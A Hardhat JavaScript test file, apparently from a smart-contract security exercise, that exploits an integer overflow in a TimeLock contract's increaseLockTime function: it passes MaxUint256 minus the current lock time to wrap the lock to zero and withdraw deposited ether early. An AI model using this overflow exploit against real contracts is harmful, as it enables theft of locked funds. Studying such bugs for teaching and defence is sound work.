const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");

describe("Time Lock", async function () {
    let l_contract
    let attacker;
    describe("Deploy", function () {
        it("should be deployed", async function () {
            const lock = await ethers.getContractFactory("TimeLock");
            l_contract = await lock.deploy();
            await l_contract.deployed();
            console.log(l_contract.address);
            expect(l_contract.address).not.null;
            attacker = await ethers.getSigner();
            console.log("attacker",attacker.address)
        });
        it("Should be able to deposit ethter", async function(){ 
            let balanceETH = await ethers.provider.getBalance(l_contract.address);
            expect(balanceETH).to.equal(parseEther("0"));
            // deposit ehter
            let tx = await l_contract.connect(attacker).deposit({value:parseEther("2")})
            await tx.wait()
            // check if the ether is deposited
            balanceETH = await ethers.provider.getBalance(l_contract.address);
            expect(balanceETH).to.equal(parseEther("2"));
            

        });

        it("Should be able to withdraw and skip lock", async function(){
            // use the increaseLockTime method of the contract + integer underflow to reduce the locktime to zero
            let  attacker_lock_time = await l_contract.lockTime(attacker.address);
            let attacker_ballance = await l_contract.balances(attacker.address);
            console.log(`attacker ballance ${attacker_ballance}`)
            const value = (BigNumber.from(ethers.constants.MaxUint256)).sub(BigNumber.from(attacker_lock_time - 1)); 
            console.log("value to extend", value)
            console.log("max uint",ethers.constants.MaxUint256)
            let tx = await l_contract.connect(attacker).increaseLockTime(value);
            await tx.wait();
            attacker_lock_time = await l_contract.lockTime(attacker.address);
            console.log(`attacker lock time ${attacker_lock_time}`);
            expect(attacker_lock_time).equal("0");

            tx = await l_contract.connect(attacker).withdraw();
            await tx.wait();
            // check if the ether is deposited
            balanceETH = await ethers.provider.getBalance(l_contract.address);
            expect(balanceETH).to.equal(parseEther("0"));
            
            attacker_ballance = await l_contract.balances(attacker.address);
            console.log(`attacker ballance ${attacker_ballance}`);
            expect(attacker_ballance).equal("0");

        });
    })

})